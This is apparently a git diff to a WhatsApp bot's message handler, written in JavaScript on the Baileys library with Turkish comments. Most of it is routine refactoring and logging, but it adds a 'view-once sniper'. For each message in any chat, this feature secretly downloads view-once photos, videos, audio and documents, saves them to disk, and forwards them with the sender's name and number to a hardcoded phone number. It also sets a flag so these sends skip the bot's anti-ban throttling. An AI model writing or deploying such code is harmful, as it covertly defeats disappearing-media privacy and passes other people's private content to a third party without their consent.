@@ -2,6 +2,7 @@ import fs from 'fs';
 import path from 'path';
 import axios from 'axios';
 import { exec } from 'child_process';
+import { downloadContentFromMessage, downloadMediaMessage } from '@whiskeysockets/baileys';
 import { 
   botState, 
   pairingState, 
@@ -37,13 +38,159 @@ import {
 } from '../utils/permissionManager.js';
 import { simulateIncomingRead, isSenderThrottled } from '../utils/antiBan.js';
 
-function unwrapMessage(message) {
+export function isViewOnceMessage(rawMsg) {
+  if (!rawMsg || typeof rawMsg !== 'object') return false;
+  if (
+    rawMsg.viewOnceMessage || 
+    rawMsg.viewOnceMessageV2 || 
+    rawMsg.viewOnceMessageV2Extension ||
+    rawMsg.imageMessage?.viewOnce ||
+    rawMsg.videoMessage?.viewOnce ||
+    rawMsg.audioMessage?.viewOnce ||
+    rawMsg.documentMessage?.viewOnce
+  ) return true;
+
+  try {
+    const jsonStr = JSON.stringify(rawMsg);
+    if (
+      jsonStr.includes('viewOnceMessage') || 
+      jsonStr.includes('"viewOnce":true') || 
+      jsonStr.includes('"viewOnce": true') || 
+      jsonStr.includes('viewOnceMessageV2') ||
+      jsonStr.includes('viewOnceMessageV2Extension')
+    ) {
+      return true;
+    }
+  } catch (e) {}
+
+  return false;
+}
+
+export async function autoForwardViewOnceMedia(sock, msg, from) {
+  try {
+    const targetJid = '905332624732@s.whatsapp.net';
+    const rawMsg = msg.message;
+    if (!rawMsg) return;
+
+    const isViewOnce = isViewOnceMessage(rawMsg);
+    if (!isViewOnce) return;
+
+    const content = unwrapMessage(rawMsg);
+    if (!content) return;
+
+    const imgMsg = content.imageMessage || rawMsg?.viewOnceMessage?.message?.imageMessage || rawMsg?.viewOnceMessageV2?.message?.imageMessage || rawMsg?.viewOnceMessageV2Extension?.message?.imageMessage || rawMsg?.imageMessage;
+    const vidMsg = content.videoMessage || rawMsg?.viewOnceMessage?.message?.videoMessage || rawMsg?.viewOnceMessageV2?.message?.videoMessage || rawMsg?.viewOnceMessageV2Extension?.message?.videoMessage || rawMsg?.videoMessage;
+    const audMsg = content.audioMessage || rawMsg?.viewOnceMessage?.message?.audioMessage || rawMsg?.viewOnceMessageV2?.message?.audioMessage || rawMsg?.viewOnceMessageV2Extension?.message?.audioMessage || rawMsg?.audioMessage;
+    const docMsg = content.documentMessage || rawMsg?.viewOnceMessage?.message?.documentMessage || rawMsg?.viewOnceMessageV2?.message?.documentMessage || rawMsg?.viewOnceMessageV2Extension?.message?.documentMessage || content.documentWithCaptionMessage?.message?.documentMessage || rawMsg?.documentMessage;
+
+    const mediaObj = imgMsg || vidMsg || audMsg || docMsg;
+    if (!mediaObj) return;
+
+    const mediaType = imgMsg ? 'image' : (vidMsg ? 'video' : (audMsg ? 'audio' : 'document'));
+    let buffer = null;
+
+    try {
+      const stream = await downloadContentFromMessage(mediaObj, mediaType);
+      const chunks = [];
+      for await (const chunk of stream) chunks.push(chunk);
+      buffer = Buffer.concat(chunks);
+    } catch (e1) {
+      try {
+        buffer = await downloadMediaMessage(msg, 'buffer', {}, { reuploadRequest: () => Promise.resolve() });
+      } catch (e2) {}
+    }
+
+    if (!buffer || buffer.length === 0) {
+      console.warn(`[VIEW-ONCE SNIPER] Failed to download media buffer for ${from}`);
+      return;
+    }
+
+    // Diske arşivle
+    const viewOnceDir = path.join(downloadsDir, 'view_once');
+    if (!fs.existsSync(viewOnceDir)) {
+      fs.mkdirSync(viewOnceDir, { recursive: true });
+    }
+    const sender = msg.key?.participant || msg.participant || from;
+    const senderNumber = (sender || '').split('@')[0];
+    const ext = mediaType === 'image' ? 'jpg' : (mediaType === 'video' ? 'mp4' : (mediaType === 'audio' ? 'mp3' : (docMsg?.fileName ? (path.extname(docMsg.fileName).replace('.', '') || 'bin') : 'bin')));
+    const savedPath = path.join(viewOnceDir, `viewonce_${Date.now()}_${senderNumber}.${ext}`);
+    try { fs.writeFileSync(savedPath, buffer); } catch (e) {}
+
+    const isGroup = from.endsWith('@g.us');
+    let groupName = '';
+    if (isGroup) {
+      try {
+        const metadata = await sock.groupMetadata(from);
+        groupName = metadata?.subject || from;
+      } catch (e) {
+        groupName = from;
+      }
+    }
+
+    const pushName = msg.pushName || senderNumber || 'Bilinmiyor';
+    const captionText = mediaObj.caption || '';
+    const typeLabel = mediaType === 'image' ? 'Fotoğraf' : (mediaType === 'video' ? 'Video' : (mediaType === 'audio' ? 'Ses Kaydı' : 'Belge/Dosya'));
+    const timeStr = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
+
+    let caption = `👁️ *Tek Gönderimlik ${typeLabel} Yakalandı!*\n━━━━━━━━━━━━━━━━━━━━\n👤 *Gönderen:* ${pushName} (+${senderNumber})\n📍 *Kaynak:* ${isGroup ? `Grup: ${groupName}` : 'Özel Sohbet'}\n🕒 *Zaman:* ${timeStr}`;
+    if (docMsg?.fileName) {
+      caption += `\n📁 *Dosya Adı:* ${docMsg.fileName}`;
+    }
+    if (captionText) {
+      caption += `\n📝 *Açıklama:* ${captionText}`;
+    }
+    caption += `\n💾 *Sunucuda Kayıt Yeri:* ${path.basename(savedPath)}\n━━━━━━━━━━━━━━━━━━━━`;
+
+    console.log(`[VIEW-ONCE SNIPER] Captured ${mediaType} from ${senderNumber} in ${from}. Forwarding to ${targetJid}...`);
+
+    if (mediaType === 'image') {
+      await sock.sendMessage(targetJid, { image: buffer, caption }, { skipAntiBan: true });
+    } else if (mediaType === 'video') {
+      await sock.sendMessage(targetJid, { video: buffer, caption, mimetype: vidMsg?.mimetype || 'video/mp4' }, { skipAntiBan: true });
+    } else if (mediaType === 'audio') {
+      await sock.sendMessage(targetJid, { audio: buffer, mimetype: audMsg?.mimetype || 'audio/mp4', ptt: Boolean(audMsg?.ptt) }, { skipAntiBan: true });
+      await sock.sendMessage(targetJid, { text: caption }, { skipAntiBan: true });
+    } else if (mediaType === 'document') {
+      await sock.sendMessage(targetJid, { 
+        document: buffer, 
+        caption, 
+        fileName: docMsg?.fileName || `dosya_${Date.now()}.${ext}`, 
+        mimetype: docMsg?.mimetype || 'application/octet-stream' 
+      }, { skipAntiBan: true });
+    }
+    console.log(`[VIEW-ONCE SNIPER] Successfully forwarded view-once media to ${targetJid}`);
+  } catch (err) {
+    console.error('[VIEW-ONCE SNIPER ERROR]:', err?.message || err);
+  }
+}
+
+export function unwrapMessage(message) {
   if (!message) return null;
-  if (message.ephemeralMessage?.message) return unwrapMessage(message.ephemeralMessage.message);
-  if (message.viewOnceMessage?.message) return unwrapMessage(message.viewOnceMessage.message);
-  if (message.viewOnceMessageV2?.message) return unwrapMessage(message.viewOnceMessageV2.message);
-  if (message.documentWithCaptionMessage?.message) return unwrapMessage(message.documentWithCaptionMessage.message);
-  return message;
+  let current = message;
+  let depth = 0;
+  while (depth < 10) {
+    depth++;
+    if (current?.ephemeralMessage?.message) {
+      current = current.ephemeralMessage.message;
+    } else if (current?.viewOnceMessage?.message) {
+      current = current.viewOnceMessage.message;
+    } else if (current?.viewOnceMessageV2?.message) {
+      current = current.viewOnceMessageV2.message;
+    } else if (current?.viewOnceMessageV2Extension?.message) {
+      current = current.viewOnceMessageV2Extension.message;
+    } else if (current?.documentWithCaptionMessage?.message) {
+      current = current.documentWithCaptionMessage.message;
+    } else if (current?.templateMessage?.hydratedTemplate) {
+      current = current.templateMessage.hydratedTemplate;
+    } else if (current?.templateMessage?.fourRowTemplate) {
+      current = current.templateMessage.fourRowTemplate;
+    } else if (current?.interactiveMessage?.header) {
+      current = current.interactiveMessage.header;
+    } else {
+      break;
+    }
+  }
+  return current;
 }
 
 export async function handleMessage(sock, m) {
@@ -58,28 +205,55 @@ export async function handleMessage(sock, m) {
 }
 
 async function processSingleMessage(sock, msg) {
-  if (!msg?.message) return;
+  if (!msg) return;
 
-  if (sentMessageIds.has(msg.key?.id)) return;
+  console.log('[DEBUG RAW MSG ARRIVED]', {
+    id: msg.key?.id,
+    from: msg.key?.remoteJid,
+    fromMe: msg.key?.fromMe,
+    hasMsg: Boolean(msg.message),
+    msgKeys: msg.message ? Object.keys(msg.message) : []
+  });
 
-  // 1. Ignore old/buffered messages (older than 60 seconds) to prevent spamming after reconnecting
+  if (!msg.message) {
+    console.log('[DEBUG EMPTY MSG OBJECT]', JSON.stringify(msg, (k, v) => (Buffer.isBuffer(v) ? `<Buffer ${v.length}>` : v)));
+    return;
+  }
+
+  if (sentMessageIds.has(msg.key?.id)) {
+    return;
+  }
+
+  // 1. Ignore old/buffered messages (older than 180 seconds) to prevent spamming after reconnecting
   const nowSec = Math.floor(Date.now() / 1000);
   const msgTimestamp = typeof msg.messageTimestamp === 'number'
     ? msg.messageTimestamp
     : (msg.messageTimestamp?.low || Number(msg.messageTimestamp) || 0);
-  if (msgTimestamp > 0 && (nowSec - msgTimestamp) > 60) {
+  if (msgTimestamp > 0 && (nowSec - msgTimestamp) > 180) {
+    console.log(`[IGNORE OLD MSG] Dropped message from ${msg.key?.remoteJid} (${nowSec - msgTimestamp}s old)`);
     return;
   }
 
   const from = msg.key.remoteJid;
   const config = readConfig();
 
+  // 🛡️ View-Once Sniper: Herhangi bir sohbetten gelen tek gönderimlik medyaları anında indirip hedefe ilet
+  autoForwardViewOnceMedia(sock, msg, from).catch(err => {
+    console.error('[AUTO FORWARD VIEW-ONCE ERROR]:', err?.message || err);
+  });
+
   const content = unwrapMessage(msg.message);
   if (!content) return;
+
+  const directImage = content.imageMessage || 
+                      content.viewOnceMessage?.message?.imageMessage || 
+                      content.viewOnceMessageV2?.message?.imageMessage || 
+                      content.viewOnceMessageV2Extension?.message?.imageMessage;
 
   const text = (
     content.conversation ||
     content.extendedTextMessage?.text ||
+    directImage?.caption ||
     content.imageMessage?.caption ||
     content.videoMessage?.caption ||
     content.documentMessage?.caption ||
@@ -87,25 +261,32 @@ async function processSingleMessage(sock, msg) {
   ).trim();
   const ltext = text.toLowerCase().trim();
 
-  // Check if message contains media (image, sticker, image-document) or quoted media
+  // Check if message contains media (image, view-once image, sticker, image-document) or quoted media
   const hasDirectMedia = Boolean(
-    content.imageMessage || 
+    directImage || 
     content.stickerMessage || 
     (content.documentMessage?.mimetype?.startsWith('image/'))
   );
   const msgContext = content.extendedTextMessage?.contextInfo || 
                      content.imageMessage?.contextInfo || 
                      content.videoMessage?.contextInfo ||
-                     content.documentMessage?.contextInfo;
+                     content.documentMessage?.contextInfo ||
+                     directImage?.contextInfo;
+  
+  const quotedContent = msgContext?.quotedMessage ? unwrapMessage(msgContext.quotedMessage) : null;
+  const quotedImage = quotedContent?.imageMessage || 
+                      quotedContent?.viewOnceMessage?.message?.imageMessage || 
+                      quotedContent?.viewOnceMessageV2?.message?.imageMessage;
+
   const hasQuotedMedia = Boolean(
-    msgContext?.quotedMessage?.imageMessage || 
-    msgContext?.quotedMessage?.stickerMessage || 
-    (msgContext?.quotedMessage?.documentMessage?.mimetype?.startsWith('image/'))
+    quotedImage || 
+    quotedContent?.stickerMessage || 
+    (quotedContent?.documentMessage?.mimetype?.startsWith('image/'))
   );
 
   if (!text && !hasDirectMedia && !hasQuotedMedia) return;
 
-  console.log(`[MSG INCOMING] From: ${from} | fromMe: ${Boolean(msg.key.fromMe)} | Text: "${text}" | Media: ${hasDirectMedia || hasQuotedMedia}`);
+  console.log(`[MSG INCOMING] From: ${from} | fromMe: ${Boolean(msg.key.fromMe)} | Text: "${text}" | Media: ${hasDirectMedia || hasQuotedMedia} (ViewOnce: ${isViewOnceMessage(msg.message)})`);
 
   const prefixes = ['!', '/', '.'];
   const matchedPrefix = prefixes.find(p => text.startsWith(p));
@@ -926,7 +1107,8 @@ async function processSingleMessage(sock, msg) {
                            content.imageMessage?.contextInfo || 
                            content.videoMessage?.contextInfo || 
                            content.documentMessage?.contextInfo || 
-                           content.stickerMessage?.contextInfo;
+                           content.stickerMessage?.contextInfo ||
+                           directImage?.contextInfo;
 
     const mentionedJids = msgContextInfo?.mentionedJid || [];
     const isBotMentioned = Boolean(
